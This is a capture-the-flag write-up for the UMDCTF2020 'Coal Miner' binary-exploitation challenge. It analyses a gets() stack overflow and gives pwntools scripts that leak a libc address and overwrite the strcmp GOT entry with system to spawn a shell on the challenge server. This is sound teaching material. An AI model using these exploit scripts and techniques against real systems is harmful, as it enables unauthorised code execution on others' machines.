# Coal Miner - Exploitation

## Description

First to fall over when the atmosphere is less than perfect

Your sensibilities are shaken by the slightest defect

nc 161.35.8.211 9999  
Author: moogboi

## Solution

We are given a binary "coalminer"

```  
$ file coalminer  
coalminer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=bd336cddc0548ae0bc5e123e3932fd91be29888a, not stripped  
```

```  
$ checksec coalminer  
[*] '/home/yodak/Documents/umdctf2020/coalminer/coalminer'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

We can add or print items

```  
$ ./coalminer

Welcome to the Item Database  
You may choose the commands 'add' or 'print' or 'done'  
> add

Enter a name:  
aaaaa  
Enter a description:  
aaaa  
> print

Item 1  
	aaaaa  
	aaaa

> done

```

First, lets understand how adding new item works, thats how "AddItem" function
looks in ghidra:

```  
void AddItem(astruct *param_1)  
{  
 uint uVar1;  
 void *pvVar2;  
 long in_FS_OFFSET;  
 undefined8 local_28;  
 long local_20;  
  
 local_20 = *(long *)(in_FS_OFFSET + 0x28);  
 uVar1 = param_1->number_of_items;  
 pvVar2 = malloc(0x20);  
 *(void **)(&param_1->description + (ulong)uVar1 * 0x10) = pvVar2;  
 puts("Enter a name: ");  
 gets(&param_1->name + (ulong)(uint)param_1->number_of_items * 0x10);  
 puts("Enter a description: ");  
 gets((char *)&local_28);  
 **(undefined8 **)(&param_1->description +
(ulong)(uint)param_1->number_of_items * 0x10) = local_28;  
 param_1->number_of_items = param_1->number_of_items + 1;  
 if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {  
                   /* WARNING: Subroutine does not return */  
   __stack_chk_fail();  
 }  
 return;  
}

```

We can see that it allocates 32 bytes on the heap for the item description,
then it reads to stack a name of the item, reads description to local
variable, and then copies the 8 bytes of description to previously allocated
memory on the heap. We can clearly see that using the gets functions causes
stack buffer overflow, but from checksec command we deduced that stack canary
is used, which doesn't allow us to just overflow funtion return address. The
parameter passed to the AddItem function is a local variable in the main
function, so let's take a look how these variables are actually stored. That's
how the stack looks before returning from "AddItem" function.

```  
pwndbg> x/200xg $rsp  
0x7fffffffdbf0: 0x0000000000602080      0x00007fffffffdc30  
0x7fffffffdc00: 0x0000000062626262      0x09cea916a7582800  
0x7fffffffdc10: 0x0000000000400b90      0x0000000000400b90  
0x7fffffffdc20: 0x00007fffffffde50      0x0000000000400af7  
0x7fffffffdc30: 0x0000000061616161      0x00000000006036b0  
                       .  
                       .  
                       .  
0x7fffffffde30: 0x0000000000000001      0x0000000000400770  
```

My input for the name was "aaaa" and for the description "bbbb", the name
landed on address 0x7fffffffdc30, which is main local variable, on address
0x7fffffffdc38 we can see address of space allocated by malloc, where is
copied the description of item, which is stored at address 0x7fffffffdc00,
address 0x7fffffffde30 stores number of items which is increased by one every
time the function is called. We can establish from this that a single item is
a struct looking something like this:

```  
struct Item {  
   char name[8];  
   char *description;  
};  
```

The "PrintItems" function just looks how many items there is (address
0x7fffffffde30 in my case) and prints name and description (which is the
address to the heap) of the items. So to exploit this first we have to
determine which version of libc is run on the server. We can use the gets
function that saves Item name and can overwrite the address of item
description and then use the "PrintItems" function (it prints the description
of item at an address) to read address from GOT. But first we have to find a
way to not overwrite that address because "addItem" function saves there the
description suplied by second gets.

```  
gets((char *)&local_28);  
**(undefined8 **)(&param_1->description +
(ulong)(uint)param_1->number_of_items * 0x10) = local_28;  
```

To do this we can supply more than one item and overwrite the variable that
stores the number of items, to make "addItem" function not to overwrite the
address we want to read. Script that I used:

```  
from pwn import *

r = remote('161.35.8.211', 9999)  
puts_plt=0x602020  
address=0x602010 # address that we dont care if it gets overwritten

print(r.recvuntil('> '))

r.sendline('add')  
r.sendline('a'*8+p64(puts_plt)+'b'*8+p64(address)+'c'*(480)+"\x01")  
r.sendline('asdf')

print(r.recvuntil('> '))

r.sendline('print')

par = r.recvuntil('> ')

puts_libc = u64(par.split("\n")[3][1:]+"\0\0")

print(hex(puts_libc))

r.close()

```

The variable that stores the number of items is overwritten by 1, it is
incremented by one by "AddItem" function and then the description supplied by
gets is written to 0x602010 and the 0x602020 is not changed.

To identify which libc is running I used https://libc.nullbyte.cat/

After that we can write the actual script to exploit it, I replaced the strcmp
funtion address in GOT by system function, because it uses string provided by
user in which we just write "/b*/sh" (the wildcard * is used becaues it reads
7 bytes from user)

```  
from pwn import *

r = remote('161.35.8.211', 9999)  
puts_plt=0x602020  
address=0x602010 # random address that we dont care if it gets overwritten  
strcmp_plt=0x602050  
offset_system=0x03f480  
offset_puts=0x068f90

print(r.recvuntil('> '))

r.sendline('add')  
r.sendline('a'*8+p64(puts_plt)+'b'*8+p64(address)+'c'*(480)+"\x01")  
r.sendline('asdf')

print(r.recvuntil('> '))

r.sendline('print')

par = r.recvuntil('> ')

libc = u64(par.split("\n")[3][1:]+"\0\0")-offset_puts  
print(hex(libc))

r.sendline('add')

r.sendline('a'*8+p64(strcmp_plt))  
r.sendline(p64(libc+offset_system))  
print(r.recvuntil('> '))

r.sendline('/b*/sh')

r.interactive()

r.close()

```

Original writeup
(https://github.com/Yodakasi/ctf_writeups/tree/master/UMDCTF2020/coalminer).